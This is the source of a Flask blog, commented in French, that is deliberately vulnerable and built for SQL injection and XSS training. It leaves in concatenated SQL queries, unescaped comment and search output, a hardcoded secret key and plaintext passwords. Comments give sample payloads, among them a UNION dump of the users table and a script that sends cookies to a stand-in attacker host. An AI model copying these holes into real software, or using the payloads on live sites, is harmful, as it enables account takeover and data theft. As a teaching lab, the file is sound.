"""
╔══════════════════════════════════════════════════════════════╗
║         SecureBlog — Application VOLONTAIREMENT VULNÉRABLE   ║
║         Usage: Démonstration SQLi & XSS uniquement          ║
║         NE PAS déployer en production                        ║
╚══════════════════════════════════════════════════════════════╝
"""

from flask import Flask, request, render_template, redirect, url_for, session, make_response
from werkzeug.middleware.proxy_fix import ProxyFix
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'cle_super_secrete_ne_pas_utiliser_en_prod'

app.wsgi_app = ProxyFix(app.wsgi_app, x_prefix=1)
app.config['APPLICATION_ROOT'] = '/secureblog'

DB_PATH = '/app/data/blog.db'

# ─────────────────────────────────────────────
#  Utilitaires base de données
# ─────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    os.makedirs('/app/data', exist_ok=True)
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role     TEXT DEFAULT "user"
        );
        CREATE TABLE IF NOT EXISTS posts (
            id      INTEGER PRIMARY KEY,
            title   TEXT NOT NULL,
            content TEXT NOT NULL,
            author  TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS comments (
            id      INTEGER PRIMARY KEY,
            post_id INTEGER,
            author  TEXT,
            content TEXT
        );
        CREATE TABLE IF NOT EXISTS secret_data (
            id   INTEGER PRIMARY KEY,
            info TEXT
        );
    ''')

    # Données de démo
    c.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','Admin@1234','admin')")
    c.execute("INSERT OR IGNORE INTO users VALUES (2,'alice','alice123','user')")
    c.execute("INSERT OR IGNORE INTO users VALUES (3,'bob','bob456','user')")
    c.execute("INSERT OR IGNORE INTO secret_data VALUES (1,'FLAG{sqli_union_success_tu_as_reussi}')")
    c.execute("INSERT OR IGNORE INTO secret_data VALUES (2,'Carte bancaire: 4111-1111-1111-1111')")
    c.execute("INSERT OR IGNORE INTO posts VALUES (1,'Bienvenue sur SecureBlog','Bienvenue ! Ce blog est une démonstration des vulnérabilités web courantes. Explorez les articles et testez vos connaissances en sécurité.','admin')")
    c.execute("INSERT OR IGNORE INTO posts VALUES (2,'Les attaques SQLi expliquées','L injection SQL est une technique qui exploite les failles de validation des entrées utilisateur dans les requêtes SQL...','alice')")
    c.execute("INSERT OR IGNORE INTO posts VALUES (3,'Comprendre le XSS','Le Cross-Site Scripting permet à un attaquant d injecter du code JavaScript malveillant dans une page web visitée par d autres utilisateurs...','bob')")
    conn.commit()
    conn.close()


# ─────────────────────────────────────────────
#  Routes
# ─────────────────────────────────────────────

@app.route('/')
def home():
    conn = get_db()
    posts = conn.execute('SELECT * FROM posts').fetchall()
    conn.close()
    return render_template('home.html', posts=posts, user=session.get('user'), role=session.get('role'))


# ══════════════════════════════════════════════
# VULNÉRABILITÉ 1 — SQLi sur la page de Login
# Payload: ' OR '1'='1' --
# ══════════════════════════════════════════════
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    debug_query = None

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        conn = get_db()

        # ⚠️  VULNÉRABILITÉ : concaténation directe dans la requête SQL
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        debug_query = query  # affiché en mode démo pour montrer l'injection

        try:
            user = conn.execute(query).fetchone()
        except Exception as e:
            error = f"Erreur SQL : {str(e)}"
            return render_template('login.html', error=error, debug_query=debug_query)
        finally:
            conn.close()

        if user:
            session['user'] = user['username']
            session['role'] = user['role']
            return redirect(url_for('home'))
        else:
            error = "Identifiants incorrects."

    return render_template('login.html', error=error, debug_query=debug_query)


# ══════════════════════════════════════════════
# VULNÉRABILITÉ 2 — SQLi UNION + XSS Réfléchi
# SQLi  : ' UNION SELECT id,username,password,role FROM users --
# XSS   : <script>alert('XSS Réfléchi !')</script>
# ══════════════════════════════════════════════
@app.route('/search')
def search():
    q = request.args.get('q', '')
    results = []
    error = None
    raw_query = None

    if q:
        conn = get_db()
        # ⚠️  VULNÉRABILITÉ SQLi : injection directe dans LIKE
        raw_query = f"SELECT * FROM posts WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'"
        try:
            results = conn.execute(raw_query).fetchall()
        except Exception as e:
            error = str(e)
        finally:
            conn.close()

    # ⚠️  VULNÉRABILITÉ XSS : q renvoyé sans encodage (filtre |safe dans le template)
    return render_template('search.html',
                           results=results,
                           query=q,
                           error=error,
                           raw_query=raw_query,
                           user=session.get('user'))


# ══════════════════════════════════════════════
# VULNÉRABILITÉ 3 — XSS Stocké dans les commentaires
# Payload: <script>document.location='http://attaquant.com/steal?c='+document.cookie</script>
# ══════════════════════════════════════════════
@app.route('/post/<int:post_id>', methods=['GET', 'POST'])
def post_detail(post_id):
    conn = get_db()

    # ⚠️  SQLi secondaire : post_id non paramétré (bonus)
    article = conn.execute(f'SELECT * FROM posts WHERE id={post_id}').fetchone()

    if request.method == 'POST':
        author  = request.form.get('author', 'Anonyme')
        content = request.form.get('content', '')
        # ⚠️  VULNÉRABILITÉ XSS Stocké : contenu sauvegardé sans sanitisation
        conn.execute(
            'INSERT INTO comments (post_id, author, content) VALUES (?, ?, ?)',
            (post_id, author, content)
        )
        conn.commit()

    comments = conn.execute(
        f'SELECT * FROM comments WHERE post_id={post_id}'
    ).fetchall()
    conn.close()

    return render_template('post.html',
                           post=article,
                           comments=comments,
                           user=session.get('user'))


# ══════════════════════════════════════════════
# VULNÉRABILITÉ 4 — XSS basé sur DOM
# URL : /profile?name=<img src=x onerror=alert('XSS DOM')>
# ══════════════════════════════════════════════
@app.route('/profile')
def profile():
    name = request.args.get('name', '')
    # ⚠️  VULNÉRABILITÉ : paramètre injecté via innerHTML côté JS (voir template)
    return render_template('profile.html', name=name, user=session.get('user'))


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))


# ─────────────────────────────────────────────
#  Point d'entrée
# ─────────────────────────────────────────────
if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
